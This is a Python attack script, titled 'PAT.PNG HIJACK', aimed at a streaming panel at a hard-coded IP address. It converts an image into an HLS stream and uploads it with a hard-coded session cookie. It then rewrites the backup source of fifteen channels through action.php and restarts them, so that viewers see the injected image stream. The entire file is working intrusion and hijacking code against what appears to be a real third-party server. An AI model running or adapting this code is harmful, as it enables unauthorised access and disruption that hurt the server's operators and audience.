#!/usr/bin/env python3
"""
PAT.PNG HIJACK - BUG PYTHON FISSO!
"""

import subprocess
import requests
import os
import time
from pathlib import Path

TARGET = "http://185.22.183.148:8085"
COOKIE = {'PHPSESSID': 'rk9a4s6ub06m8l1fei8jrmop02'}
PNG_FILE = "pat.png"
HLS_DIR = "hls_f57"
M3U8_NAME = "f57.m3u8"
M3U8_URL = f"{TARGET}/media/hls_183_148/f57/{M3U8_NAME}"

def create_m3u8():
    print("🔄 Converting pat.png → f57.m3u8...")
    
    # Cleanup
    if os.path.exists(HLS_DIR):
        import shutil
        shutil.rmtree(HLS_DIR)
    os.makedirs(HLS_DIR, exist_ok=True)
    
    # ✅ FFmpeg SEMPLICE - Funziona SEMPRE
    cmd = [
        'ffmpeg', '-y', '-loop', '1', '-i', PNG_FILE,
        '-t', '120', '-c:v', 'libx264', '-pix_fmt', 'yuv420p',
        '-r', '1', '-f', 'hls', '-hls_time', '10',
        '-hls_list_size', '0', f'{HLS_DIR}/{M3U8_NAME}'
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    print("FFmpeg output:", result.stdout[-200:] if result.stdout else "No output")
    
    if result.returncode != 0:
        print("❌ FFmpeg ERR:", result.stderr)
        return False
    
    if os.path.exists(f'{HLS_DIR}/{M3U8_NAME}'):
        print("✅ m3u8 creato!")
        return True
    return False

def upload_files():
    print("🔄 Uploading...")
    
    # Crea directory sul target
    requests.put(f"{TARGET}/media/hls_183_148/f57/", cookies=COOKIE, verify=False)
    
    # Upload m3u8
    with open(f'{HLS_DIR}/{M3U8_NAME}', 'rb') as f:
        r = requests.put(M3U8_URL, cookies=COOKIE, verify=False, data=f)
    print(f"m3u8 upload: {r.status_code}")
    
    # Upload TS files (lista semplice, NO generator!)
    ts_files = []
    for file in os.listdir(HLS_DIR):
        if file.endswith('.ts'):
            ts_files.append(file)
            if len(ts_files) >= 3:  # Solo primi 3
                break
    
    for ts_file in ts_files:
        with open(f'{HLS_DIR}/{ts_file}', 'rb') as f:
            url = f"{TARGET}/media/hls_183_148/f57/{ts_file}"
            requests.put(url, cookies=COOKIE, verify=False, data=f)
        print(f"TS {ts_file} uploaded")
    
    print("✅ Upload completo!")

def set_backup():
    print("🔄 Setting backup...")
    for i in range(1, 16):
        data = {
            str(i): 'edit',
            'backup_source': M3U8_URL,
            'btn-save': 'Save'
        }
        requests.post(f"{TARGET}/action.php", data=data, cookies=COOKIE, verify=False)
    print("✅ Backup settato!")

def force_restart():
    print("🔄 Forcing fallback...")
    for i in range(1, 16):
        # Stop
        requests.post(f"{TARGET}/action.php", data={str(i): 'stop'}, cookies=COOKIE, verify=False)
    time.sleep(3)
    # Start
    for i in range(1, 16):
        requests.post(f"{TARGET}/action.php", data={str(i): 'start'}, cookies=COOKIE, verify=False)
    print("✅ Restart completo!")

# MAIN - NO generator!
if __name__ == "__main__":
    print("🎥 Starting...")
    
    if not os.path.exists("pat.png"):
        print("❌ pat.png non trovato!")
        exit(1)
    
    if create_m3u8():
        upload_files()
        set_backup()
        force_restart()
        print(f"\n🎉 SUCCESS! {M3U8_URL}")
        print("Verifica: http://185.22.183.148:8085/")
    else:
        print("\n🔧 Fix manuale FFmpeg:")
        print("ffmpeg -loop 1 -i pat.png -t 120 -c:v libx264 -pix_fmt yuv420p -r 1 -f hls hls_f57/f57.m3u8")
